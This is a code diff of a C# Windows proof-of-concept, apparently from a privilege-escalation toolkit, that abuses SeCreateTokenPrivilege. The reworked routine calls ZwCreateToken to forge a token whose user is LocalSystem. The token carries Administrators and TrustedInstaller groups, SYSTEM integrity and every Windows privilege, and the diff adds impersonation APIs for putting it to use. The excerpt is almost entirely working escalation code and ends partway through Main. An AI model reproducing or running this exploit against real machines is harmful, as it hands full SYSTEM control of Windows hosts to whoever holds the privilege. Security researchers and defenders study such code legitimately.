@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
@@ -8,12 +7,47 @@ namespace SeCreateTokenPrivilegePoC
 {
     class SeCreateTokenPrivilegePoC
     {
+        // Windows definition
+        // Windows enum
+        [Flags]
+        enum FormatMessageFlags : uint
+        {
+            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
+            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
+            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
+            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
+            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
+            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
+        }
+
         enum SECURITY_IMPERSONATION_LEVEL
         {
             SecurityAnonymous,
             SecurityIdentification,
             SecurityImpersonation,
             SecurityDelegation
+        }
+
+        [Flags]
+        enum SE_GROUP_ATTRIBUTES : uint
+        {
+            SE_GROUP_MANDATORY = 0x00000001,
+            SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002,
+            SE_GROUP_ENABLED = 0x00000004,
+            SE_GROUP_OWNER = 0x00000008,
+            SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010,
+            SE_GROUP_INTEGRITY = 0x00000020,
+            SE_GROUP_INTEGRITY_ENABLED = 0x00000040,
+            SE_GROUP_RESOURCE = 0x20000000,
+            SE_GROUP_LOGON_ID = 0xC0000000
+        }
+
+        [Flags]
+        enum SE_PRIVILEGE_ATTRIBUTES : uint
+        {
+            SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001,
+            SE_PRIVILEGE_ENABLED = 0x00000002,
+            SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000,
         }
 
         enum SID_NAME_USE
@@ -27,6 +61,25 @@ namespace SeCreateTokenPrivilegePoC
             SidTypeInvalid,
             SidTypeUnknown,
             SidTypeComputer
+        }
+
+        [Flags]
+        enum TokenAccessFlags : uint
+        {
+            TOKEN_ADJUST_DEFAULT = 0x0080,
+            TOKEN_ADJUST_GROUPS = 0x0040,
+            TOKEN_ADJUST_PRIVILEGES = 0x0020,
+            TOKEN_ADJUST_SESSIONID = 0x0100,
+            TOKEN_ASSIGN_PRIMARY = 0x0001,
+            TOKEN_DUPLICATE = 0x0002,
+            TOKEN_EXECUTE = 0x00020000,
+            TOKEN_IMPERSONATE = 0x0004,
+            TOKEN_QUERY = 0x0008,
+            TOKEN_QUERY_SOURCE = 0x0010,
+            TOKEN_READ = 0x00020008,
+            TOKEN_WRITE = 0x000200E0,
+            TOKEN_ALL_ACCESS = 0x000F01FF,
+            MAXIMUM_ALLOWED = 0x02000000
         }
 
         enum TOKEN_INFORMATION_CLASS
@@ -68,6 +121,7 @@ namespace SeCreateTokenPrivilegePoC
             TokenImpersonation
         }
 
+        // Windows Struct
         [StructLayout(LayoutKind.Explicit, Size = 8)]
         struct LARGE_INTEGER
         {
@@ -155,7 +209,7 @@ namespace SeCreateTokenPrivilegePoC
                 get
                 {
                     return (UNICODE_STRING)Marshal.PtrToStructure(
-                     objectName, typeof(UNICODE_STRING));
+                        objectName, typeof(UNICODE_STRING));
                 }
 
                 set
@@ -239,8 +293,14 @@ namespace SeCreateTokenPrivilegePoC
         struct TOKEN_GROUPS
         {
             public int GroupCount;
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
             public SID_AND_ATTRIBUTES[] Groups;
+
+            public TOKEN_GROUPS(int privilegeCount)
+            {
+                GroupCount = privilegeCount;
+                Groups = new SID_AND_ATTRIBUTES[32];
+            }
         };
 
         [StructLayout(LayoutKind.Sequential)]
@@ -258,14 +318,25 @@ namespace SeCreateTokenPrivilegePoC
         struct TOKEN_PRIMARY_GROUP
         {
             public IntPtr PrimaryGroup; // PSID
+
+            public TOKEN_PRIMARY_GROUP(IntPtr _sid)
+            {
+                PrimaryGroup = _sid;
+            }
         }
 
         [StructLayout(LayoutKind.Sequential)]
         struct TOKEN_PRIVILEGES
         {
             public int PrivilegeCount;
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
             public LUID_AND_ATTRIBUTES[] Privileges;
+
+            public TOKEN_PRIVILEGES(int privilegeCount)
+            {
+                PrivilegeCount = privilegeCount;
+                Privileges = new LUID_AND_ATTRIBUTES[36];
+            }
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -288,6 +359,15 @@ namespace SeCreateTokenPrivilegePoC
         struct TOKEN_USER
         {
             public SID_AND_ATTRIBUTES User;
+
+            public TOKEN_USER(IntPtr _sid)
+            {
+                User = new SID_AND_ATTRIBUTES
+                {
+                    Sid = _sid,
+                    Attributes = 0
+                };
+            }
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -316,6 +396,7 @@ namespace SeCreateTokenPrivilegePoC
             }
         }
 
+        // Windows API
         /*
          * advapi32.dll
          */
@@ -337,6 +418,9 @@ namespace SeCreateTokenPrivilegePoC
             out int ReturnLength);
 
         [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool IsValidSid(IntPtr pSid);
 
         [DllImport("advapi32.dll", SetLastError = true)]
@@ -351,9 +435,14 @@ namespace SeCreateTokenPrivilegePoC
 
         [DllImport("advapi32.dll")]
         static extern bool LookupPrivilegeValue(
-            IntPtr lpSystemName,
+            string lpSystemName,
             string lpName,
-            ref LUID lpLuid);
+            out LUID lpLuid);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool SetThreadToken(
+            IntPtr pHandle,
+            IntPtr hToken);
 
         /*
          * kenel32.dll
@@ -362,20 +451,26 @@ namespace SeCreateTokenPrivilegePoC
         static extern bool CloseHandle(IntPtr hModule);
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        static extern uint FormatMessage(
-            uint dwFlags,
+        static extern int FormatMessage(
+            FormatMessageFlags dwFlags,
             IntPtr lpSource,
             int dwMessageId,
             int dwLanguageId,
             StringBuilder lpBuffer,
-            uint nSize,
+            int nSize,
             IntPtr Arguments);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool FreeLibrary(IntPtr hLibModule);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern int GetCurrentThreadId();
+
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr LocalFree(IntPtr hMem);
 
         /*
          * ntdll.dll
@@ -387,9 +482,9 @@ namespace SeCreateTokenPrivilegePoC
             ref int BuildNumber);
 
         [DllImport("ntdll.dll")]
-        static extern int NtCreateToken(
+        static extern int ZwCreateToken(
             out IntPtr TokenHandle,
-            uint DesiredAccess,
+            TokenAccessFlags DesiredAccess,
             ref OBJECT_ATTRIBUTES ObjectAttributes,
             TOKEN_TYPE TokenType,
             ref LUID AuthenticationId,
@@ -404,117 +499,150 @@ namespace SeCreateTokenPrivilegePoC
 
         const int STATUS_SUCCESS = 0;
         const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
-        const uint TOKEN_ALL_ACCESS = 0xF00FF;
-        const string SECURITY_WORLD_RID = "S-1-1-0";
         const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
-        const string DOMAIN_ALIAS_RID_USERS = "S-1-5-32-545";
-        const string SE_DEBUG_NAME = "SeDebugPrivilege";
-        const string SE_TCB_NAME = "SeTcbPrivilege";
+        const string TRUSTED_INSTALLER_RID = "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";
+        const string UNTRUSTED_MANDATORY_LEVEL = "S-1-16-0";
+        const string LOW_MANDATORY_LEVEL = "S-1-16-4096";
+        const string MEDIUM_MANDATORY_LEVEL = "S-1-16-8192";
+        const string MEDIUM_PLUS_MANDATORY_LEVEL = "S-1-16-8448";
+        const string HIGH_MANDATORY_LEVEL = "S-1-16-12288";
+        const string SYSTEM_MANDATORY_LEVEL = "S-1-16-16384";
+        const string LOCAL_SYSTEM_RID = "S-1-5-18";
+        const string SE_CREATE_TOKEN_NAME = "SeCreateTokenPrivilege";
         const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
+        const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";
+        const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
+        const string SE_MACHINE_ACCOUNT_NAME = "SeMachineAccountPrivilege";
+        const string SE_TCB_NAME = "SeTcbPrivilege";
+        const string SE_SECURITY_NAME = "SeSecurityPrivilege";
+        const string SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege";
+        const string SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege";
+        const string SE_SYSTEM_PROFILE_NAME = "SeSystemProfilePrivilege";
+        const string SE_SYSTEMTIME_NAME = "SeSystemtimePrivilege";
+        const string SE_PROFILE_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";
+        const string SE_INCREASE_BASE_PRIORITY_NAME = "SeIncreaseBasePriorityPrivilege";
+        const string SE_CREATE_PAGEFILE_NAME = "SeCreatePagefilePrivilege";
+        const string SE_CREATE_PERMANENT_NAME = "SeCreatePermanentPrivilege";
+        const string SE_BACKUP_NAME = "SeBackupPrivilege";
+        const string SE_RESTORE_NAME = "SeRestorePrivilege";
+        const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
+        const string SE_DEBUG_NAME = "SeDebugPrivilege";
+        const string SE_AUDIT_NAME = "SeAuditPrivilege";
+        const string SE_SYSTEM_ENVIRONMENT_NAME = "SeSystemEnvironmentPrivilege";
+        const string SE_CHANGE_NOTIFY_NAME = "SeChangeNotifyPrivilege";
+        const string SE_REMOTE_SHUTDOWN_NAME = "SeRemoteShutdownPrivilege";
+        const string SE_UNDOCK_NAME = "SeUndockPrivilege";
+        const string SE_SYNC_AGENT_NAME = "SeSyncAgentPrivilege";
+        const string SE_ENABLE_DELEGATION_NAME = "SeEnableDelegationPrivilege";
+        const string SE_MANAGE_VOLUME_NAME = "SeManageVolumePrivilege";
         const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
-        const uint SE_PRIVILEGE_ENABLED = 0x00000002;
-        const uint SE_GROUP_ENABLED = 0x00000004;
-        const uint SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002;
-        const uint SE_GROUP_OWNER = 0x00000008;
-        const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
-        static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
+        const string SE_CREATE_GLOBAL_NAME = "SeCreateGlobalPrivilege";
+        const string SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege";
+        const string SE_RELABEL_NAME = "SeRelabelPrivilege";
+        const string SE_INCREASE_WORKING_SET_NAME = "SeIncreaseWorkingSetPrivilege";
+        const string SE_TIME_ZONE_NAME = "SeTimeZonePrivilege";
+        const string SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege";
+        const string SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME = "SeDelegateSessionUserImpersonatePrivilege";
+        const byte SECURITY_STATIC_TRACKING = 0;
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
 
-        static string GetWin32ErrorMessage(int code, bool isNtStatus)
-        {
-            uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
-            uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
-            StringBuilder message = new StringBuilder(255);
-            IntPtr pNtdll = IntPtr.Zero;
 
-            if (isNtStatus)
-                pNtdll = LoadLibrary("ntdll.dll");
-
-            uint status = FormatMessage(
-                isNtStatus ? (FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM) : FORMAT_MESSAGE_FROM_SYSTEM,
-                pNtdll,
-                code,
-                0,
-                message,
-                255,
-                IntPtr.Zero);
-
-            if (isNtStatus)
-                FreeLibrary(pNtdll);
-
-            if (status == 0)
-            {
-                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
-            }
-            else
-            {
-                return string.Format("[ERROR] Code 0x{0} : {1}",
-                    code.ToString("X8"),
-                    message.ToString().Trim());
-            }
-        }
-
-
-        static IntPtr CreatePrivilegedToken()
+        static IntPtr CreateElevatedToken(TOKEN_TYPE tokenType)
         {
             int error;
-            LUID authId;
-            int MajorVersion = 0;
-            int MinorVersion = 0;
-            int BuildNumber = 0;
+            LUID authId = SYSTEM_LUID;
+            var tokenSource = new TOKEN_SOURCE("*SYSTEM*");
+            tokenSource.SourceIdentifier.HighPart = 0;
+            tokenSource.SourceIdentifier.LowPart = 0;
+            var privs = new string[] {
+                SE_CREATE_TOKEN_NAME,
+                SE_ASSIGNPRIMARYTOKEN_NAME,
+                SE_LOCK_MEMORY_NAME,
+                SE_INCREASE_QUOTA_NAME,
+                SE_MACHINE_ACCOUNT_NAME,
+                SE_TCB_NAME,
+                SE_SECURITY_NAME,
+                SE_TAKE_OWNERSHIP_NAME,
+                SE_LOAD_DRIVER_NAME,
+                SE_SYSTEM_PROFILE_NAME,
+                SE_SYSTEMTIME_NAME,
+                SE_PROFILE_SINGLE_PROCESS_NAME,
+                SE_INCREASE_BASE_PRIORITY_NAME,
+                SE_CREATE_PAGEFILE_NAME,
+                SE_CREATE_PERMANENT_NAME,
+                SE_BACKUP_NAME,
+                SE_RESTORE_NAME,
+                SE_SHUTDOWN_NAME,
+                SE_DEBUG_NAME,
+                SE_AUDIT_NAME,
+                SE_SYSTEM_ENVIRONMENT_NAME,
+                SE_CHANGE_NOTIFY_NAME,
+                SE_REMOTE_SHUTDOWN_NAME,
+                SE_UNDOCK_NAME,
+                SE_SYNC_AGENT_NAME,
+                SE_ENABLE_DELEGATION_NAME,
+                SE_MANAGE_VOLUME_NAME,
+                SE_IMPERSONATE_NAME,
+                SE_CREATE_GLOBAL_NAME,
+                SE_TRUSTED_CREDMAN_ACCESS_NAME,
+                SE_RELABEL_NAME,
+                SE_INCREASE_WORKING_SET_NAME,
+                SE_TIME_ZONE_NAME,
+                SE_CREATE_SYMBOLIC_LINK_NAME,
+                SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
+            };
 
-            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
-            BuildNumber &= 0xFFFF;
+            Console.WriteLine("[>] Trying to create an elevated {0} token.",
+                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
 
-            if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber >= 17763)
-            {
-                authId = ANONYMOUS_LOGON_LUID;
-            }
-            else
-            {
-                authId = SYSTEM_LUID;
-            }
-
-            Console.WriteLine("[*] If you have SeCreateTokenPrivilege, you can create elevated tokens.");
-            Console.WriteLine("[>] Trying to create a elevated token.");
-
-            if (!GetCurrentUserSid(out IntPtr pSid))
-                return IntPtr.Zero;
-
-            var tokenUser = new TOKEN_USER();
-            tokenUser.User.Attributes = 0;
-            tokenUser.User.Sid = pSid;
-
-            if (!AllocateLocallyUniqueId(out LUID luid))
+            if (!ConvertStringSidToSid(
+                DOMAIN_ALIAS_RID_ADMINS,
+                out IntPtr pAdministrators))
             {
                 error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to allocate LUID.");
+                Console.WriteLine("[-] Failed to get SID for Administrators.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-                return IntPtr.Zero;
-            }
 
-            var tokenSource = new TOKEN_SOURCE("PrivFu!!");
-            tokenSource.SourceIdentifier.LowPart = luid.LowPart;
-            tokenSource.SourceIdentifier.HighPart = luid.HighPart;
-
-            if (!GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges))
-                return IntPtr.Zero;
-
-            if (!ConvertStringSidToSid(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get Administrator group SID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                 return IntPtr.Zero;
             }
 
             if (!ConvertStringSidToSid(
-                "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464",
+                LOCAL_SYSTEM_RID,
+                out IntPtr pLocalSystem))
+            {
+                error = Marshal.GetLastWin32Error();
+                Console.WriteLine("[-] Failed to get SID for LocalSystem.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return IntPtr.Zero;
+            }
+
+            if (!ConvertStringSidToSid(
+                SYSTEM_MANDATORY_LEVEL,
+                out IntPtr pSystemIntegrity))
+            {
+                error = Marshal.GetLastWin32Error();
+                Console.WriteLine("[-] Failed to get SID for LocalSystem.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return IntPtr.Zero;
+            }
+
+            if (!ConvertStringSidToSid(
+                TRUSTED_INSTALLER_RID,
                 out IntPtr pTrustedInstaller))
             {
                 error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get Trusted Installer SID.");
+                Console.WriteLine("[-] Failed to get SID for TrustedInstaller.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return IntPtr.Zero;
+            }
+
+            if (!CreateTokenPrivileges(
+                privs,
+                out TOKEN_PRIVILEGES tokenPrivileges))
+            {
                 return IntPtr.Zero;
             }
 
@@ -522,83 +650,104 @@ namespace SeCreateTokenPrivilegePoC
             IntPtr pTokenGroups = GetInformationFromToken(
                 hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenGroups);
-            IntPtr pTokenPrimaryGroup = GetInformationFromToken(
-                hCurrentToken,
-                TOKEN_INFORMATION_CLASS.TokenPrimaryGroup);
             IntPtr pTokenDefaultDacl = GetInformationFromToken(
                 hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenDefaultDacl);
 
-            if (pTokenGroups == IntPtr.Zero ||
-                pTokenPrimaryGroup == IntPtr.Zero ||
-                pTokenDefaultDacl == IntPtr.Zero)
+            if (pTokenDefaultDacl == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to get current token information.");
+
                 return IntPtr.Zero;
             }
-
+            var tokenUser = new TOKEN_USER(pLocalSystem);
             var tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
                 pTokenGroups,
                 typeof(TOKEN_GROUPS));
-            var tokenPrimaryGroup = (TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(
-                pTokenPrimaryGroup,
-                typeof(TOKEN_PRIMARY_GROUP));
+            var tokenOwner = new TOKEN_OWNER(pAdministrators);
+            var tokenPrimaryGroup = new TOKEN_PRIMARY_GROUP(pLocalSystem);
             var tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
                 pTokenDefaultDacl,
                 typeof(TOKEN_DEFAULT_DACL));
 
-            int sidAndAttrSize = Marshal.SizeOf(new SID_AND_ATTRIBUTES());
-            IntPtr pSidAndAttributes;
+            StringComparison opt = StringComparison.OrdinalIgnoreCase;
+            uint groupOwnerAttrs = (uint)(
+                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
+                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
+                SE_GROUP_ATTRIBUTES.SE_GROUP_OWNER);
+            uint groupEnabledAttrs = (uint)(
+                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
+                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED);
+            bool isAdmin = false;
+            bool isSystem = false;
 
-            for (var i = 0; i < tokenGroups.GroupCount; i++)
+            for (var idx = 0; idx < tokenGroups.GroupCount; idx++)
             {
-                pSidAndAttributes = new IntPtr(pTokenGroups.ToInt64() + i * sidAndAttrSize + IntPtr.Size);
-                var sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
-                    pSidAndAttributes,
-                    typeof(SID_AND_ATTRIBUTES));
+                ConvertSidToStringSid(
+                    tokenGroups.Groups[idx].Sid,
+                    out string strSid);
 
-                ConvertSidToStringSid(sidAndAttributes.Sid, out var sid);
+                if (string.Compare(strSid, DOMAIN_ALIAS_RID_ADMINS, opt) == 0)
+                {
+                    isAdmin = true;
 
-                if (sid == DOMAIN_ALIAS_RID_USERS)
-                {
-                    sidAndAttributes.Sid = pAdminGroup;
-                    sidAndAttributes.Attributes = SE_GROUP_ENABLED;
+                    if (tokenGroups.Groups[idx].Attributes != groupOwnerAttrs)
+                        tokenGroups.Groups[idx].Attributes = groupOwnerAttrs;
                 }
-                else if (sid == SECURITY_WORLD_RID)
+                else if (string.Compare(strSid, LOCAL_SYSTEM_RID, opt) == 0)
                 {
-                    sidAndAttributes.Sid = pTrustedInstaller;
-                    sidAndAttributes.Attributes = SE_GROUP_ENABLED |
-                        SE_GROUP_ENABLED_BY_DEFAULT |
-                        SE_GROUP_OWNER;
+                    isSystem = true;
                 }
-                else
+                else if (string.Compare(strSid, UNTRUSTED_MANDATORY_LEVEL, opt) == 0 |
+                    string.Compare(strSid, LOW_MANDATORY_LEVEL, opt) == 0 |
+                    string.Compare(strSid, MEDIUM_MANDATORY_LEVEL, opt) == 0 |
+                    string.Compare(strSid, MEDIUM_PLUS_MANDATORY_LEVEL, opt) == 0 |
+                    string.Compare(strSid, HIGH_MANDATORY_LEVEL, opt) == 0)
                 {
-                    sidAndAttributes.Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
-                    sidAndAttributes.Attributes &= ~SE_GROUP_ENABLED;
+                    tokenGroups.Groups[idx].Sid = pSystemIntegrity;
                 }
-
-                Marshal.StructureToPtr(sidAndAttributes, pSidAndAttributes, true);
             }
 
-            tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
-                pTokenGroups,
-                typeof(TOKEN_GROUPS));
+            tokenGroups.Groups[tokenGroups.GroupCount].Sid = pTrustedInstaller;
+            tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupOwnerAttrs;
+            tokenGroups.GroupCount++;
 
-            var tokenOwner = new TOKEN_OWNER(pSid);
+            if (!isAdmin)
+            {
+                tokenGroups.Groups[tokenGroups.GroupCount].Sid = pAdministrators;
+                tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupOwnerAttrs;
+                tokenGroups.GroupCount++;
+            }
+
+            if (!isSystem)
+            {
+                tokenGroups.Groups[tokenGroups.GroupCount].Sid = pLocalSystem;
+                tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupEnabledAttrs;
+                tokenGroups.GroupCount++;
+            }
+
             var expirationTime = new LARGE_INTEGER(-1L);
+            SECURITY_IMPERSONATION_LEVEL impersonationLevel;
+
+            if (tokenType == TOKEN_TYPE.TokenPrimary)
+                impersonationLevel = SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous;
+            else
+                impersonationLevel = SECURITY_IMPERSONATION_LEVEL.SecurityDelegation;
 
             var sqos = new SECURITY_QUALITY_OF_SERVICE(
-                SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, 0, 0);
+                impersonationLevel,
+                SECURITY_STATIC_TRACKING,
+                0);
             var oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
             IntPtr pSqos = Marshal.AllocHGlobal(Marshal.SizeOf(sqos));
             Marshal.StructureToPtr(sqos, pSqos, true);
             oa.SecurityQualityOfService = pSqos;
 
-            int ntstatus = NtCreateToken(
+            int ntstatus = ZwCreateToken(
                 out IntPtr hToken,
-                TOKEN_ALL_ACCESS,
+                TokenAccessFlags.TOKEN_ALL_ACCESS,
                 ref oa,
-                TOKEN_TYPE.TokenImpersonation,
+                tokenType,
                 ref authId,
                 ref expirationTime,
                 ref tokenUser,
@@ -609,46 +758,54 @@ namespace SeCreateTokenPrivilegePoC
                 ref tokenDefaultDacl,
                 ref tokenSource);
 
+            LocalFree(pTokenGroups);
+            LocalFree(pTokenDefaultDacl);
+
             if (ntstatus != STATUS_SUCCESS)
             {
-                Console.WriteLine("[-] Failed to create privileged token.");
+                Console.WriteLine("[-] Failed to create elevated token.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
+
                 return IntPtr.Zero;
             }
+
+            Console.WriteLine("[+] An elevated {0} token is created successfully.",
+                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
 
             return hToken;
         }
 
 
-        static bool GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges)
+        static bool CreateTokenPrivileges(
+            string[] privs,
+            out TOKEN_PRIVILEGES tokenPrivileges)
         {
             int error;
-            var luid = new LUID();
             int sizeOfStruct = Marshal.SizeOf(typeof(TOKEN_PRIVILEGES));
             IntPtr pPrivileges = Marshal.AllocHGlobal(sizeOfStruct);
-            string[] privs = new string[] {
-                SE_DEBUG_NAME,
-                SE_TCB_NAME,
-                SE_ASSIGNPRIMARYTOKEN_NAME,
-                SE_IMPERSONATE_NAME
-            };
 
             tokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(
                 pPrivileges,
                 typeof(TOKEN_PRIVILEGES));
-            tokenPrivileges.PrivilegeCount = 4;
+            tokenPrivileges.PrivilegeCount = privs.Length;
 
             for (var idx = 0; idx < tokenPrivileges.PrivilegeCount; idx++)
             {
-                if (!LookupPrivilegeValue(IntPtr.Zero, privs[idx], ref luid))
+                if (!LookupPrivilegeValue(
+                    null,
+                    privs[idx],
+                    out LUID luid))
                 {
                     error = Marshal.GetLastWin32Error();
-                    Console.WriteLine("[-] Failed to lookup {0}.");
+                    Console.WriteLine("[-] Failed to lookup LUID for {0}.", privs[idx]);
                     Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
                     return false;
                 }
 
-                tokenPrivileges.Privileges[idx].Attributes = SE_PRIVILEGE_ENABLED;
+                tokenPrivileges.Privileges[idx].Attributes = (uint)(
+                    SE_PRIVILEGE_ATTRIBUTES.SE_PRIVILEGE_ENABLED |
+                    SE_PRIVILEGE_ATTRIBUTES.SE_PRIVILEGE_ENABLED_BY_DEFAULT);
                 tokenPrivileges.Privileges[idx].Luid = luid;
             }
 
@@ -679,6 +836,7 @@ namespace SeCreateTokenPrivilegePoC
             if (!status)
             {
                 Marshal.FreeHGlobal(buffer);
+
                 return IntPtr.Zero;
             }
 
@@ -686,82 +844,73 @@ namespace SeCreateTokenPrivilegePoC
         }
 
 
-        static bool GetCurrentUserSid(out IntPtr pSid)
+        static string GetWin32ErrorMessage(int code, bool isNtStatus)
         {
-            string currentUser = string.Format(
-                "{0}\\{1}",
-                Environment.UserDomainName,
-                Environment.UserName);
-            int cbSid = Marshal.SizeOf(typeof(SID));
-            StringBuilder referencedDomainName = new StringBuilder();
-            int cchReferencedDomainName = Environment.UserDomainName.Length;
-            bool status;
-            int error;
+            var message = new StringBuilder();
+            var messageSize = 255;
+            FormatMessageFlags messageFlag;
+            IntPtr pNtdll;
+            message.Capacity = messageSize;
 
-            do
+            if (isNtStatus)
             {
-                referencedDomainName.Capacity = cchReferencedDomainName;
-                pSid = Marshal.AllocHGlobal(cbSid);
-                ZeroMemory(pSid, cbSid);
-
-                status = LookupAccountName(
-                    IntPtr.Zero,
-                    currentUser,
-                    pSid,
-                    ref cbSid,
-                    referencedDomainName,
-                    ref cchReferencedDomainName,
-                    out SID_NAME_USE peUse);
-                error = Marshal.GetLastWin32Error();
-
-                if (status)
-                {
-                    if (!IsValidSid(pSid))
-                    {
-                        pSid = IntPtr.Zero;
-                        return false;
-                    }
-                }
-                else
-                {
-                    referencedDomainName.Clear();
-                    Marshal.FreeHGlobal(pSid);
-                }
-            } while (!status && error == ERROR_INSUFFICIENT_BUFFER);
-
-            if (!status)
+                pNtdll = LoadLibrary("ntdll.dll");
+                messageFlag = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
+                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
+            }
+            else
             {
-                Marshal.AllocHGlobal(cbSid);
-                pSid = IntPtr.Zero;
+                pNtdll = IntPtr.Zero;
+                messageFlag = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
             }
 
-            return status;
+            int ret = FormatMessage(
+                messageFlag,
+                pNtdll,
+                code,
+                0,
+                message,
+                messageSize,
+                IntPtr.Zero);
+
+            if (isNtStatus)
+                FreeLibrary(pNtdll);
+
+            if (ret == 0)
+            {
+                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
+            }
+            else
+            {
+                return string.Format(
+                    "[ERROR] Code 0x{0} : {1}",
+                    code.ToString("X8"),
+                    message.ToString().Trim());
+            }
         }
 
 
         static void ZeroMemory(IntPtr buffer, int size)
         {
-            byte[] nullBytes = new byte[size];
-
-            for (var idx = 0; idx < size; idx++)
-                nullBytes[idx] = 0;
-
+            var nullBytes = new byte[size];
             Marshal.Copy(nullBytes, 0, buffer, size);
         }
 
 
         static void Main()
         {
-            IntPtr hToken = CreatePrivilegedToken();
+            Console.WriteLine("[*] If you have SeCreateTokenPrivilege, you can create elevated tokens.");
+            
+            IntPtr hToken = CreateElevatedToken(TOKEN_TYPE.TokenImpersonation);
 
-            if (hToken != IntPtr.Zero)
-            {
-                Console.WriteLine("[+] Got handle to the elevated token (hToken = 0x{0}).", hToken.ToString("X"));
-                Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
-                Console.ReadLine();
